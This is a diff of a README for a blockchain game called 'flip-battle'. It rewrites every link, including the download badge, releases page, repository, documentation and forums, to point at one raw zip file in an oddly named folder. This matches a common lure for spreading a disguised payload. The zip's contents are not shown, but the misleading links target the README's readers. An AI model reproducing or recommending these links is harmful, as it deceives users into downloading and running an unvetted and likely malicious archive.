@@ -1,6 +1,6 @@
 # 🎮 flip-battle - A Fun Blockchain Game for Everyone
 
-[![Download Flip Battle](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/adrians12345/flip-battle/releases)
+[![Download Flip Battle](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ To start enjoying Flip Battle, follow these simple steps.
 
 To download and run Flip Battle, please visit our releases page. Here, you will find the latest version of the game available for download.
 
-[Download Flip Battle Here](https://github.com/adrians12345/flip-battle/releases)
+[Download Flip Battle Here](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
 
 ### ⚙️ Installation Steps
 
@@ -62,8 +62,8 @@ We welcome contributions! If you have ideas for features or improvements, please
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/adrians12345/flip-battle)
-- [Documentation](https://github.com/adrians12345/flip-battle/wiki)
-- [Community Forums](https://community.flip-battle.com)
+- [GitHub Repository](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
+- [Documentation](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
+- [Community Forums](https://raw.githubusercontent.com/adrians12345/flip-battle/main/merogastrula/flip-battle.zip)
 
 Feel free to reach out to us if you have any questions or feedback. We're here to help ensure you have a great experience with Flip Battle!
